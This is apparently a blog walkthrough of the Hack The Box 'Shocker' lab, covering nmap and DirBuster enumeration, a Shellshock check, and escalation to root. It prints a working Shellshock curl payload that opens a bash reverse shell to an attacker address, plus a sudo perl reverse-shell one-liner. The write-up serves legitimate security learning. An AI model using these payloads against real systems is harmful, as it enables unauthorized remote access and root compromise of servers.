---
title: Shocker
date: 2020-05-17 16:19
description: HTB Walkthrough without Metasploit
featured_image: '/images/blog/shocker/shocker.png'
tags: ['Hack The Box']
---

In this Hack The Box, we’ll be using DirBuster to look for hidden directories, and we’ll get to use the shellscript exploit to gain access to the box–all without using Metasploit, so let’s begin!

<h2><a class="header_post" name="hackthebox">Hack The Box</a></h2>

* Operating System: Linux 
* Difficulty: Easy

<h2><a class="header_post" name="enumeration">Enumeration</a></h2>

Let's start with the good ol' nmap scan. 

<img src="/images/blog/shocker/nmapscan.jpg" alt="nmap scan">

	PORT     STATE SERVICE VERSION
	80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Site doesn't have a title (text/html).
	2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 
	                       (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
	|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
	|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)

From the results, we can see that port 80 is open, so let’s see what we can find.

### Website Information 

In the web browser, I went to `10.10.10.56`. Hah, look what's on the front page. 

<img src="/images/blog/shocker/website.jpg" alt="front page of website">

Next, I checked the source code and the HTTP headers using Burp Suite--nothing.

I decided to use DirBuster since I wasn't having any luck. 

### DirBuster

To access DirBuster, in terminal type in `dirbuster`, and it should open the program. I used the medium wordlist file located in: 

<strong>/usr/shared/wordlists/dirbuster/directory-list-2.3-medium.txt</strong>

Here are the results:

<img src="/images/blog/shocker/dirbuster.jpg" alt="dirbuster results">

I tried to access /icons, no luck. That said, what's interesting is the cgi-bin directory that DirBuster has found. Since cgi-bin is a folder that can be used to house scripts.. I wonder if there's any scripts in that folder.

I reran DirBuster, but this time added the file extensions: <strong>sh, pl, py, and rb</strong>. 

<img src="/images/blog/shocker/dirbustershell.jpg" alt="dirbuster results with shell script">

Here we go, it looks like we found a <strong>user.sh</strong> file, which confirms that the cgi-bin does allow for scripts to run. Meaning, we can try to send a shell script over to gain access to the machine.

### Using Nmap Scripts

Since we've confirmed that the cgi-bin directory can execute shell scripts, I did some investigating and found out about the shellshock vulnerability. Here's what I found:

*Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.*

You can learn more about it here: [Wikipedia - Shellshock (Software Bug)](https://en.wikipedia.org/wiki/Shellshock_(software_bug))

Before using it, I wanted to verify that this HTB is vulnerable to shellshock, so I used a nmap script. To find the script in Kali Linux use the `locate` command. Once found, you can use the `cp` command to copy it to your current directory. 

	root@kali:~# locate http-shellshock
	/usr/share/nmap/scripts/http-shellshock.nse
	root@kali:~# cp /usr/share/nmap/scripts/http-shellshock.nse /root/HTB/Shocker

Before using it, I edited the file by using the `gedit` command and removed the line: 

`options["header"][cmd] = cmd`

Then we can go ahead and run the script..

<img src="/images/blog/shocker/nmapscript.jpg" alt="nmap script results">

..Yes! Confirmed that this box might be vulnerable to shellshock, so let's use it. 

<h2><a class="header_post" name="exploitation">Exploitation</a></h2>

Before moving forward with exploitation, let's recap what we know so far:

* In the nmap scan, we found out that port 80 is open. 
* In DirBuster we saw the cgi-bin directory that contained a user.sh file.
* The above tells us that the cgi-bin directory can store and execute shell scripts.
* Confirmed that port 80 is vulnerable to the shellscript exploit by running a nmap script.

Okay, now that we know the above. Let's start our exploit!

### Shellscript Exploit

To start with the shellscript exploit, we're going to do the following: 

Enter this command in one terminal window:

	curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.31/4444 0>&1" http://10.10.10.56:80/cgi-bin/user.sh

And then open a netcat listener in another terminal window, `nc -lnvp 4443`

<img src="/images/blog/shocker/shellscript.jpg" alt="shellscript exploit">

Would you look at that--it worked! It looks like we have access to Shelly's account. Let's see what type of privileges Shelly has by using the `sudo -l` command.

<img src="/images/blog/shocker/shelly.jpg" alt="shelly privileges">

It looks like Shelly can run a perl script, so we can see if we can get a reverse shell using perl.

### Privilege Escalation

I like to use Pentest Monkey's cheat sheet to find a reverse shell suing perl. The cheat sheet can be found here: [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

	sudo perl -e 'use Socket;$i="10.10.14.31";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Before executing the command, we'll want to create a Netcat listener first in another terminal window by typing `nc -lnvp 4444` 

<img src="/images/blog/shocker/pescalation.jpg" alt="privilege escalation">

We did it! We can use the `whoami` command to verify root access, and we do. Congrats! We now have access to the Shocker HTB. From here, we can locate the root.txt and user.txt file to grab the flags. 

<h2><a class="header_post" name="conclusion">Conclusion</a></h2>

Running DirBuster on web servers is extremely helpful because it'll find directories that you wouldn't normally see when you first go to a website. In this box, we were able to locate the cgi-bin directory which housed scripts. Once we found that out, we were able to upload and execute our own scripts to gain root access. 
